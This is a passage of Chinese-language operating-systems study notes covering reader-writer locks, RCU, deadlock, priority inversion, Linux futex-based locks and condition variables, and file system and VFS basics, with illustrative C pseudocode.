<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rwlock</span> <span class="title">lock</span>;</span></span><br><span class="line"><span class="type">char</span> data[SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reader</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    lock_reader(&amp;lock);</span><br><span class="line">    read_data(data); --&gt; 读临界区</span><br><span class="line">    unlock_reader(&amp;lock); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">writer</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    lock_writer(&amp;lock);</span><br><span class="line">    update_data(data); --&gt; 写临界区</span><br><span class="line">    unlock_writer(&amp;lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>reader writer lock</code>实现</p>
<blockquote>
<ol>
<li>倾向性：<ol>
<li>偏向读者的读写锁：读者优先，读者直接进入，写者等待所有读者离开临界区之后再进入临界区<ul>
<li><code>reader</code>与<code>writer</code>互斥</li>
<li><code>writer</code>与<code>writer</code>互斥</li>
</ul>
</li>
<li>偏向写者的读写锁：写者优先，即读者写者同时准备进入时，先等待之前所有读者离开临界区，之后写者进入，写者离开后读者再进入<ul>
<li>有新的<code>writer</code>到达后阻塞新的<code>reader</code></li>
</ul>
</li>
</ol>
</li>
</ol>
</blockquote>
<ul>
<li><p>偏向读者<code>reader</code>的读写锁</p>
<blockquote>
<p>原则：只要有一个<code>reader</code>就把<code>writer</code>的给锁上</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">---&gt; 偏向读者reader的读写锁 &lt;---</span><br><span class="line">---&gt; reader和writer不共享锁 &lt;---</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rwlock</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> reader_cnt; --&gt; 记录当前reader数</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock</span> <span class="title">reader_lock</span>;</span> --&gt; 对reader_cnt进行更新的互斥锁</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock</span> <span class="title">writer_lock</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_reader</span><span class="params">(<span class="keyword">struct</span> rwlock *lock)</span> &#123;</span><br><span class="line">    lock(&amp;lock-&gt;reader_lock);</span><br><span class="line">    	lock-&gt;reader_cnt ++;</span><br><span class="line">    	<span class="keyword">if</span>(lock-&gt;reader_cnt==<span class="number">1</span>) --&gt;第一个读者,即有读者时就不能有写者进入临界区</span><br><span class="line">            lock(&amp;lock-&gt;writer_lock); --&gt;因此锁住写者writer,阻塞后续writer</span><br><span class="line">    <span class="title function_">unlock</span><span class="params">(&amp;lock-&gt;reader_lock)</span>;</span><br><span class="line">&#125; --&gt; 可以有多个reader同时进入critical section,但一旦有writer就需要等待临界区的读者全部离开后才可以进入临界区</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock_reader</span><span class="params">(<span class="keyword">struct</span> rwlock *lock)</span> &#123;</span><br><span class="line">    lock(&amp;lock-&gt;reader_lock);</span><br><span class="line">    	lock-&gt;reader_cnt--;</span><br><span class="line">    	<span class="keyword">if</span>(lock-&gt;reader_cnt==<span class="number">0</span>) --&gt; 最后一个读者</span><br><span class="line">            unlock(&amp;lock-&gt;writer_lock);</span><br><span class="line">    unlock(&amp;lock-&gt;reader_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_writer</span><span class="params">(<span class="keyword">struct</span> rwlock *lock)</span> &#123;</span><br><span class="line">    lock(&amp;lock-&gt;writer_lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock_writer</span><span class="params">(<span class="keyword">struct</span> rwlock *lock)</span> &#123;</span><br><span class="line">    unlock(&amp;lock-&gt;writer_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>偏向写者<code>writer</code>的读写锁</p>
<blockquote>
<ol>
<li>外锁<code>rwlock</code>结构体内部借助了<code>mutex lock</code>来实现对外锁本身元数据<code>reader_cnt</code>和<code>has_writer</code>的保护</li>
<li>锁中的精华部分依然在<strong>条件变量</strong>的应用上<ol>
<li><code>cond_wait</code></li>
<li><code>cond_signal</code></li>
</ol>
</li>
<li>读者不用等待读者，只需要等待写者 —&gt; 一个<code>while</code></li>
<li>写者既要等待读者，又要等待写者 —&gt; 两个<code>while</code></li>
<li>等<code>reader</code>就用<code>reader_cond</code>；等<code>writer</code>就用<code>writer_cond</code></li>
<li>释放<code>unlock</code>时需要唤醒等待自己的线程<ol>
<li><code>reader unlock</code> –&gt; 唤醒<strong>一个</strong>等待自己的<code>writer</code> –&gt; cond_signal</li>
<li><code>writer unlock</code> –&gt;唤醒<strong>所有</strong>等待自己的<code>reader</code>和<code>writer</code> –&gt; cond_broadcast</li>
</ol>
</li>
</ol>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">---&gt; 偏向读者writer的读写锁 &lt;---</span><br><span class="line">---&gt; reader和writer共享锁 &lt;---</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rwlock</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> reader_cnt; --&gt; 记录当前reader数</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">bool</span> has_writer; --&gt; 表示当前是否有writer到达</span><br><span class="line">        					--&gt; reader_cnt和has_writer属于metadata</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lock</span> <span class="title">lock</span>;</span> --&gt; 共享lock,要求读者和写者在操作元数据前得到该锁</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cond</span> <span class="title">reader_cond</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cond</span> <span class="title">writer_cond</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_reader</span><span class="params">(<span class="keyword">struct</span> rwlock *rwlock)</span> &#123;</span><br><span class="line">    lock(&amp;rwlock-&gt;lock);</span><br><span class="line">    	<span class="keyword">while</span>(rwlock-&gt;has_writer==<span class="literal">true</span>)</span><br><span class="line">            cond_wait(&amp;rwlock-&gt;writer_cond, &amp;rwlock-&gt;lock);</span><br><span class="line">   						   --&gt; 该reader进入之前只要有writer,或者</span><br><span class="line">                             --&gt; 有writer排队期望得到lock(即使没有进入临界区)</span><br><span class="line">                             --&gt; 就挂起reader</span><br><span class="line">    	rwlock-&gt;reader_cnt++;</span><br><span class="line">    unlock(&amp;rwlock-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock_reader</span><span class="params">(<span class="keyword">struct</span> rwlock *rwlock)</span> &#123;</span><br><span class="line">    lock(&amp;rwlock-&gt;lock);</span><br><span class="line">    	rwlock-&gt;reader_cnt--;</span><br><span class="line">    	<span class="keyword">if</span> (rwlock-&gt;reader_cnt == <span class="number">0</span>)</span><br><span class="line">            cond_signal(&amp;rwlock-&gt;reader_cond);</span><br><span class="line">						--&gt; 由于reader和writer是冲突的因此</span><br><span class="line">                          --&gt; 要等到</span><br><span class="line">    unlock(&amp;rwlock-&gt;lock);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock_writer</span><span class="params">(<span class="keyword">struct</span> rwlock *rwlock)</span> &#123;</span><br><span class="line">    lock(&amp;rwlock-&gt;lock);</span><br><span class="line">    	<span class="keyword">while</span>(rwlock-&gt;has_writer == <span class="literal">true</span>)</span><br><span class="line">            cond_wait(&amp;rwlock-&gt;writer_cond, &amp;rwlock-&gt;lock); --&gt; 等待前面的writer</span><br><span class="line">    	rwlock-&gt;has_writer = <span class="literal">true</span>; --&gt;提前声明,避免后续的reader抢占</span><br><span class="line">    	<span class="keyword">while</span>(rwlock-&gt;reader_cnt&gt;<span class="number">0</span>)</span><br><span class="line">            cond_wait(&amp;rwlock-&gt;reader_cond, &amp;rwlock-&gt;lock); --&gt; 等待前面的reader</span><br><span class="line">    <span class="title function_">unlock</span><span class="params">(&amp;rwlock-&gt;lock)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock_writer</span><span class="params">(<span class="keyword">struct</span> rwlock *rwlock)</span> &#123;</span><br><span class="line">    lock(&amp;rwlock-&gt;lock);</span><br><span class="line">    	rwlock-&gt;has_writer = <span class="literal">false</span>;</span><br><span class="line">    	cond_broadcast(&amp;rwlock-&gt;writer_cond); </span><br><span class="line">    				--&gt; 广播释放所有的挂起在writer_cond上的thread</span><br><span class="line">                      --&gt; 包括等待ta的所有writer和所有reader</span><br><span class="line">    <span class="title function_">unlock</span><span class="params">(&amp;rwlock-&gt;lock)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="summary-1"><a href="#summary-1" class="headerlink" title="summary"></a>summary</h4><ul>
<li>偏向<code>reader</code>：提高读者<code>reader</code>之间的并行度，但写延迟较高</li>
<li>偏向<code>writer</code>：写延迟低，读者<code>reader</code>并行度低</li>
</ul>
<h3 id="RCU"><a href="#RCU" class="headerlink" title="RCU"></a>RCU</h3><blockquote>
<ol>
<li>读写锁允许多个读者同时进入读临界区，但写者会阻塞读者，读者仍然需要在关键路径上添加读者锁，造成性能开销</li>
<li>目的：让读者再写者更新时，要么读到旧的值，要么读到新的值，而不能观察到任何中间结果</li>
</ol>
</blockquote>
<ul>
<li><p><code>RCU (Read-Copy Update)</code>：</p>
<ul>
<li>允许多个<code>reader</code>进入<code>critical section</code></li>
<li><code>writer</code>不会阻塞<code>reader</code></li>
<li><code>reader</code>不需要使用额外的同步原语<code>synchronization primitive</code>保护<code>reader critical section</code></li>
</ul>
</li>
<li><p>主流CPU提供对 【<strong>地址对齐</strong>】的单一读写操作的原子性保证</p>
<ul>
<li><code>ARM</code>中被称为<code>single copy atomicity</code>单拷贝原子性</li>
<li>支持【位宽】一般与CPU位宽一致</li>
<li><code>64-bit</code>CPU保证【<strong>地址对齐</strong>的64位数据】的读写操作的原子性：如0x5118,0x6730，即二进制下后三位均为0，16进制下最低四位为8或0</li>
<li>写者<code>writer</code>需要更新的数据大小往往超过<code>64-bit</code>限制，为此<code>RCU</code>引入了一种【订阅 &#x2F; 发布】机制，利用对<code>64-bit pointer</code>的读写原子性，让<code>writer</code>能够【原子的】更改任意大小的数据</li>
</ul>
</li>
<li><p>【订阅 &#x2F; 发布】机制</p>
<ul>
<li>对<code>64-bit pointer</code>的更新操作是可以由<code>hardware</code>保障【原子性】的</li>
<li>【发布】接口：写，<code>rcu_assign_pointer</code></li>
<li>【订阅】接口：读，<code>rcu_dereference</code></li>
<li>因为处理器可能会【让没有依赖关系的访存操作】乱序执行，但【发布&#x2F;订阅】可以保证读写按照应当出现的顺序执行，即【将保证顺序的操作打包成两个接口，便于开发者使用】</li>
</ul>
</li>
<li><p>通过【订阅 &#x2F; 发布】机制，读者和写者可以【互不阻塞】地执行<code>critical section</code>的内容</p>
</li>
<li><p>宽限期<code>grace period</code>：为了确定何时能回收资源（由于读写互不阻塞了）</p>
<blockquote>
<p>API: <code>synchronize_rcu</code>用来阻塞写者到宽限期结束</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pointer: [旧值] --update(更新)--&gt; [新值] --free(回收旧值)--&gt; [旧值无效,新值有效]</span><br><span class="line">grace period: 从writer更新指针到最后一个可能观察到旧值的reader离开的时间段</span><br><span class="line">pointer update时,此时有一些reader进入critical section,它们是有可能观察到旧值的,</span><br><span class="line">因此为了避免旧值释放后reader读取旧值会产生危险,需要等这些可能读取旧值的reader全部</span><br><span class="line">离开critical section后才能释放旧值</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h3><ul>
<li>线程安全<code>thread-safe</code>：某个函数、函数库在多线程环境中被调用时，能够正确地使用<code>synchronization primitive</code>保护多个<code>thread</code>对共享变量的访问与修改</li>
<li>管程<code>Monitor</code>：包含两部分内容：一部分为共享的数据，一部分是操作共享数据的函数，（<code>data + function</code>适合封装成<code>class</code>，因此管程<code>monitor</code>一般用于面向对象的程序中）<code>monitor</code>保证在同一时刻最多只有一个操作者能够进入管程的保护区域访问共享数据</li>
</ul>
<h3 id="同步带来的问题"><a href="#同步带来的问题" class="headerlink" title="同步带来的问题"></a>同步带来的问题</h3><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><ul>
<li>当有多个（两个及以上）线程为有限的资源竞争时，有的线程就会因为在某一时刻没有空闲资源而陷入等待。</li>
<li>死锁<code>deadlock</code>：这一组中的每一个线程都在等待组内其他线程释放资源从而造成无限等待</li>
<li>必要条件：<ul>
<li>互斥访问</li>
<li>持有并等待</li>
<li>资源非抢占</li>
<li>循环等待</li>
</ul>
</li>
</ul>
<h4 id="死锁避免算法"><a href="#死锁避免算法" class="headerlink" title="死锁避免算法"></a>死锁避免算法</h4><blockquote>
<p>银行家算法（By Edsger Dijkstra），又称为【安全性检查】</p>
<ul>
<li>每次分配给线程新的资源时都进行安全性检查</li>
<li>安全性检查即假设满足上分配，在分配后的状态下寻找满足安全性的线程：分配给所有所需资源并假设执行完后并释放所需资源（标记执行结束），继续寻找下一个满足的线程，由此得到一个安全序列。如果存在【未标记结束】的线程且该线程处于【非安全状态】（无法满足其资源分配需求），那么就是不安全的；否则，是安全的。</li>
<li>只有在安全性检查通过之后，线程的请求才能够得到满足。</li>
<li>安全性状态就意味着系统【假设满足当前线程分配需求】后，可以找到一个【安全序列】。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">In system, there are [M] categories of resources and [N] threads.</span><br><span class="line">Available[M]; 全局可利用资源,每一种资源的当前可用量;</span><br><span class="line">Max[N][M]; 最大需求量;</span><br><span class="line">Allocation[N][M]; 已分配的;</span><br><span class="line">Need[N][M]; 还需要的;</span><br></pre></td></tr></table></figure>





<h3 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h3><ul>
<li>活锁<code>livelock</code>：基于【不允许持有并等待】，即一旦发现要等待，就释放所有持有的资源，但可能造成【动态死锁】（取决于调度器），即活锁。</li>
</ul>
<h3 id="优先级反转"><a href="#优先级反转" class="headerlink" title="优先级反转"></a>优先级反转</h3><ul>
<li><p>优先级反转<code>priority inversion</code>：由于同步导致线程执行顺序违反预设优先级的问题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">priority: A &gt; B &gt; C</span><br><span class="line">* C持有锁, A等待C的锁, 此时B抢占CPU导致A被B阻塞</span><br><span class="line">* 反转的不是C和A, 而是指A在等锁的过程中, 与该锁无关且优先级低于A的线程抢占了CPU使得其与A的优先级产生的反转</span><br></pre></td></tr></table></figure>
</li>
<li><p>实时操作系统中，<code>priority inversion</code>造成后果十分严重</p>
</li>
<li><p>为了避免优先级反转，最直接的方法是使用【<strong>不可抢占临界区协议</strong><code>Non-preemptive Critical section Protocolm NCP</code>】</p>
</li>
<li><p>现代操作系统中，最常采用的方法是【<strong>优先级继承协议</strong><code>Priority Inheritance Protocol, PIP</code>】</p>
<ul>
<li>高优先级等待锁时，会使锁的持有者继承其优先级，从而避免该锁的临界区被低优先级的任务打断</li>
</ul>
</li>
<li><p>【<strong>优先级置顶协议</strong><code>Priority Ceiling Protocol, PCP</code>】：将获取锁的线程的优先级置位可能竞争该锁的线程中的最高优先级（需要由线程提前告知操作系统）</p>
<ul>
<li>即时优先级置顶协议<code>Immediate PCP, IPCP</code>：拿到锁时即将优先级置为【<strong>可能</strong>】竞争该锁的线程中的最高优先级</li>
<li>原生优先级置顶协议<code>Original PCP, OPCP</code>：在真的有其他的线程竞争该资源时提升优先级</li>
</ul>
</li>
<li><p><code>NCP</code>和<code>IPCP</code>实现难度小</p>
</li>
<li><p><code>PIP</code>和<code>OPCP</code>实现难度大，需要监视已被获取的锁，在其他线程尝试获取该锁时提升拥有者的优先级</p>
</li>
</ul>
<h3 id="Linux中的futex"><a href="#Linux中的futex" class="headerlink" title="Linux中的futex"></a>Linux中的futex</h3><ul>
<li><p><code>futex (Fast User-space muTEX)</code>机制：</p>
<ul>
<li><p>提出背景 ：原<code>condition variable</code>是与一个基于<code>busy looping</code>的<code>mutex lock</code>搭配使用的，条件变量是为了避免【循环等待】而提出的，但其此前依赖的【互斥锁】是基于【循环等待】实现的；如果在【互斥锁】为了优化而避免【循环等待】，则其实现中需要引入【条件变量】，就会造成实现复杂、开销很大的情况</p>
<ul>
<li><p>因此，<code>Linux</code>采用<code>futex</code>机制实现的互斥锁</p>
<blockquote>
<ol>
<li>避免互斥锁中的【循环等待】</li>
<li>实现条件变量<code>Condition Variable</code>等各类同步原语<ul>
<li>如<code>Condition Variable</code>的实现里的<code>atomic_block_unlock(mutex); --&gt; 原子地挂起并同时释放锁,这两步必须是原子的</code>是通过嫁接到<code>futex_wait</code>接口实现的</li>
</ul>
</li>
</ol>
</blockquote>
<ul>
<li>竞争程度较低时，直接使用【原子操作】加锁</li>
<li>竞争程度较高时，<code>APP</code>能够通过<code>syscall</code>挂起并等待后续【锁持有者】唤醒<ul>
<li>而原始<code>lock</code>是通过【循环等待】实现的，这里【不依赖】条件变量来在<code>lock</code>内部实现【挂起 &#x2F; 唤醒】</li>
<li><code>OS</code>会为每个等待的<code>uaddr</code>维护一个<code>FIFO</code>队列，当不同线程调用<code>futex_wait</code>等待在相同的<code>uaddr</code>上时，线程会被加入该队列中，等待接下来被<code>futex_wake</code>唤醒</li>
</ul>
</li>
</ul>
</li>
<li><p><code>futex</code>接口（简化版）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">futex_wait(uaddr, val); --&gt; 等待</span><br><span class="line">    * 如果地址[uaddr]上的值与[val]相等,挂起</span><br><span class="line">futex_wake(uaddr); --&gt; 唤醒</span><br><span class="line">    * 唤醒之前因futex_wait在[uaddr]上挂起的线程</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>futex</code>实现<code>lock</code>和<code>unlock</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">futex_wait</span><span class="params">(<span class="type">int</span> *uaddr, <span class="type">int</span> val)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">futex_wake</span><span class="params">(<span class="type">int</span> *uaddr)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lock</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="type">int</span> waiters;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lock</span><span class="params">(<span class="keyword">struct</span> lock *lock)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(atomic_CAS(&amp;lock-&gt;val, <span class="number">0</span>, <span class="number">1</span>) != <span class="number">0</span>) &#123; </span><br><span class="line">        		--&gt; 如果lock-&gt;val == <span class="number">0</span>, lock-&gt;val=<span class="number">1</span>, <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">                    --&gt; 空闲,变占用,返回空闲状态<span class="number">0</span></span><br><span class="line">                 --&gt; 如果lock-&gt;val == <span class="number">1</span>, <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">                    --&gt; 占用,返回占用状态<span class="number">1</span></span><br><span class="line">        <span class="comment">/*lock非空闲,进入循环*/</span></span><br><span class="line">        atomic_FAA(&amp;lock-&gt;waiters, <span class="number">1</span>);</span><br><span class="line">        futex_wait(&amp;lock-&gt;val, <span class="number">1</span>); --&gt; 进入kernel尝试挂起</span><br><span class="line">            --&gt; kernel会为每一个等待uaddr维护一个FIFO Queue</span><br><span class="line">            --&gt; 将该线程插入kernel的 Waiting Queue</span><br><span class="line">            --&gt; 等待接下来被 futex_wait唤醒</span><br><span class="line">        atomic_FAA(&amp;lock-&gt;waiters, <span class="number">-1</span>); --&gt; 唤醒后等待着减一</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unlock</span><span class="params">(<span class="keyword">struct</span> lock *lock)</span> &#123;</span><br><span class="line">    lock-&gt;val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (lock-&gt;waiters != <span class="number">0</span>)</span><br><span class="line">        futex_wake(&amp;lock-&gt;val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux保证了不同<code>futex</code>操作的互斥性，多个<code>futex</code>操作之间只可能先后发生</p>
</li>
<li><p>条件变量（简化版）</p>
<blockquote>
<p><code>[7]</code>和<code>[8]</code>应该是绑定执行即【原子的】，此处通过<code>futex</code>机制，如果<code>[7]</code>结束后有线程进入<code>cond_signal</code>即改变了<code>cond-&gt;value</code>，此时通过新旧值对比，如果相同，<code>futex_wait</code>挂起等待满足原子性，如果不同则重新获得锁（相当于什么都没有发生）返回，由此实现要么<code>[7] and [8]</code>都一起执行，要么都不执行的原子性</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cond</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cond_wait</span><span class="params">(<span class="keyword">struct</span> cond *cond, <span class="keyword">struct</span> lock *mutex)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> local = cond-&gt;value;</span><br><span class="line">    unlock(mutex);</span><br><span class="line">    futex_wait(&amp;cond-&gt;value, local);<span class="comment">//如果</span></span><br><span class="line">    lock(mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cond_signal</span><span class="params">(<span class="keyword">struct</span> cond *cond)</span> &#123;</span><br><span class="line">    cond-&gt;value += <span class="number">1</span>;<span class="comment">//更新</span></span><br><span class="line">    futex_wake(&amp;cond-&gt;value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="9-文件系统"><a href="#9-文件系统" class="headerlink" title="9 文件系统"></a>9 文件系统</h2><hr>
<ul>
<li><p>机械硬盘<code>Hard Disk Drive (HDD)</code>、固态硬盘<code>Solid-State Drive (SSD)</code></p>
</li>
<li><p>文件数据<code>file data</code>、文件元数据<code>file metadata</code></p>
</li>
<li><p>块设备<code>block device</code></p>
</li>
<li><p>块<code>block</code>：块设备读写的最小单元，大小一般为512字节或4KB</p>
</li>
<li><p>虚拟文件系统<code>Virtual File System (VFS)</code></p>
<ul>
<li>页缓存<code>page cache</code></li>
<li>inode缓存<code>icache</code></li>
<li>目录项缓存<code>dcache</code></li>
</ul>
</li>
<li><p>inode : index node</p>
</li>
<li><p>文件类型（一部分）</p>
<ul>
<li>常规文件<code>regular file</code></li>
<li>目录文件<code>directory file</code></li>
<li>符号链接文件<code>symbolic link file</code></li>
<li><code>FIFO</code>文件：以队列形式传递数据，又称命名管道</li>
<li>套接字文件：用于传递数据，比<code>FIFO</code>更加灵活</li>
<li>字符设备文件</li>
<li>块设备文件</li>
</ul>
</li>
<li><p>目录：一种特殊的类型的<strong>文件</strong>（即目录本身也是一种文件），记录了文件名到<code>inode</code>号的映射</p>
</li>
<li><p>文件名不是文件的<code>metadata</code></p>
</li>
<li><p>硬链接<code>hard link</code></p>
</li>
<li><p>符号链接（软链接）<code>soft link</code></p>
<ul>
<li><code>ln -s file slink</code> 为<code>file</code>创建名为<code>slink</code>的软链接</li>
<li>符号链接文件保留的是一个字符串，表示一个文件路径</li>
<li>只支持<strong>读</strong>操作</li>
</ul>
</li>
<li><p>文件系统的存储布局</p>
<blockquote>
<p>只有<strong>文件数据区域</strong>被用来存放应用程序的数据，因此<strong>文件系统所显示的可用大小 &lt; 存储设备总容量</strong></p>
</blockquote>
<ul>
<li><p>超级块<code>super block</code></p>
</li>
<li><p>块分配信息</p>
<blockquote>
<p>标记<strong>文件数据块</strong>区域<strong>各个块</strong>的使用情况</p>
</blockquote>
<ul>
<li>位图<code>bitmap</code></li>
</ul>
</li>
<li><p><code>inode</code>分配信息</p>
<blockquote>
<p>标记**<code>inode</code>表<strong>的</strong>各个<code>inode</code>**的使用情况</p>
</blockquote>
</li>
<li><p><code>inode</code>表</p>
<ul>
<li>以数组<code>array</code>的形式保存了整个文件系统中所有的<code>inode</code>结构</li>
<li><code>inode</code>号：<code>inode</code>在此表中的索引</li>
<li>文件系统中对<code>inode</code>的引用只需要使用<code>inode</code>号即可，无需保存<code>inode</code>结构在存储设备中的偏移量<code>offset</code></li>
<li><code>inode</code>表的大小在文件系统创建时已经固定，因此文件系统所能保存的最大文件数量受此限制</li>
</ul>
</li>
<li><p>文件数据块</p>
</li>
</ul>
</li>
<li><p>虚拟文件系统<code>VFS (Virtual File System)</code>：对多种<code>File System</code>协调，允许它们在同一个<code>OS</code>上共同工作</p>
<ul>
<li>Linux <code>VFS (Virtual Filesystem Switch)</code><ul>
<li><p>VFS超级块</p>
</li>
<li><p>VFS的<code>inode</code>：VFS维护了一个<code>inode</code>缓存（<code>icache</code>），该缓存使用Hash表保存了OS的所有的<code>inode</code>的结构</p>
</li>
<li><p>VFS的文件数据管理</p>
<ul>
<li>基数树<code>radix tree</code></li>
</ul>
</li>
<li><p>VFS的目录项</p>
<ul>
<li>VFS在内存中为目录项维护了一个缓存，目录项缓存（<code>dcache</code>）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>VFS和文件系统的交互</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">VFS ---(read-modify-write)--- File System</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux VFS 定义文件系统应提供的方法的形式：函数指针<code>function pointer</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;回调函数</span><br><span class="line">函数指针作为某个函数的参数,函数指针变量可以作为某个函数的参数来使用的，回调函数就是一个通过函数指针调用的函数。简单讲：回调函数是由别人的函数执行时调用你实现的函数。</span><br><span class="line">&gt;&gt;&gt;以下是来自知乎作者常溪玲的解说：</span><br><span class="line">你到一个商店买东西，刚好你要的东西没有货，于是你在店员那里留下了你的电话，过了几天店里有货了，店员就打了你的电话，然后你接到电话后就到店里去取了货。在这个例子里，你的电话号码就叫回调函数，你把电话留给店员就叫登记回调函数，店里后来有货了叫做触发了回调关联的事件，店员给你打电话叫做调用回调函数，你到店里去取货叫做响应回调事件。</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux and its VFS : 实现文件读写等操作<code>(OS(kernel) --- APP(user))</code></p>
<ul>
<li><p>路径解析</p>
<blockquote>
<p><code>open</code>：文件路径 —&gt; 文件描述符<code>file descriptor</code></p>
</blockquote>
<ul>
<li><p>open  —libc—&gt; SYS_open（系统调用）—&gt; VFS</p>
</li>
<li><p>VFS对路径进行拆分得到一系列文件名（包含目录名），如果是绝对路径就从根目录开始查找，如果是相对路径，就从当前<code>.</code>目录（即工作目录）开始查找，查找过程中包括一系列权限检查，是否为目录检查等检查过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 应用程序可以使用 getcwd 和 chdir 获取和修改当前工作目录</span></span><br><span class="line">getcwd</span><br><span class="line">chdir</span><br></pre></td></tr></table></figure>
</li>
<li><p>路径解析完成后得到一个<code>inode</code>，但不直接返回给app，而是在<code>inode</code>上添加了一层抽象，即文件描述符<code>file descriptor</code></p>
</li>
</ul>
</li>
<li><p>文件描述符</p>
<blockquote>
<p>实际上是一个<code>integer</code>，由<code>VFS</code>进行维护</p>
</blockquote>
<ul>
<li><code>VFS</code>为每一个<code>process</code>维护一个文件描述符表<code>file descriptor table</code>，以文件描述符<code>fd (file descriptor)</code>为索引<code>index</code>，保存一组<strong>文件描述结构</strong></li>
</ul>
</li>
<li><p>相对路径：不以<code>/</code>开头的路径，均为相对路径</p>
</li>
<li><p>页缓存：Linux kernel 将读缓存和写缓冲区的功能合并起来管理，称为页缓存</p>
<blockquote>
<p>持久化和性能权衡之产物：文件系统将是否使用页缓存机制的判断和选择权交予APP</p>
<p>APP可以通过打开文件时附带<code>O_DIRECT</code>标志，提示文件系统<strong>不要使用页缓存</strong>  –&gt; <strong>直接I&#x2F;O</strong></p>
<p>页缓存 –&gt; <strong>缓存I&#x2F;O</strong></p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart </span><br><span class="line">		meta1(从存储设备中读取数据\n创建新的缓存页) --&gt; clean_page((干净页))</span><br><span class="line">		meta2(缓存页被回收) --- clean_page</span><br><span class="line">		clean_page --&gt;|修改缓存页中的数据| dirty_page((脏页))</span><br><span class="line">		dirty_page --&gt;|页中数据被写会存储设备| clean_page</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux 在页缓存的基础上实现了文件的<strong>内存映射机制</strong></p>
</li>
<li><p>文件内存映射：<code>mmap</code>接口</p>
